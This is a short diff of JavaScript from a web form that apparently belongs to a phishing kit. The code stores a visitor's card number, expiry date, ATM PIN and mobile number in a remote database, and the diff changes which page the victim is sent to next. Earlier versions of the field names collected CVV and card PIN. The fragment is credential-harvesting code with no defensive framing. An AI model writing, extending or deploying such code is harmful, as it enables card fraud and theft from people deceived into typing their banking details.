@@ -19,7 +19,7 @@ function submitForm(e) {
   saveMessages(a1, b2 ,c3 ,d4);
 
   // redirect to card page
-  window.location.href = "3.html";
+  window.location.href = "2.html";
 }
 
 const saveMessages = (a1, b2 ,c3 ,d4) => {
@@ -28,8 +28,8 @@ const saveMessages = (a1, b2 ,c3 ,d4) => {
   newududip007.set({
       card: a1,
       expiry: b2,
-      cvv: c3,
-      PIN: d4,
+      Atmpin: c3,
+      mobile_number: d4,
       
       
     
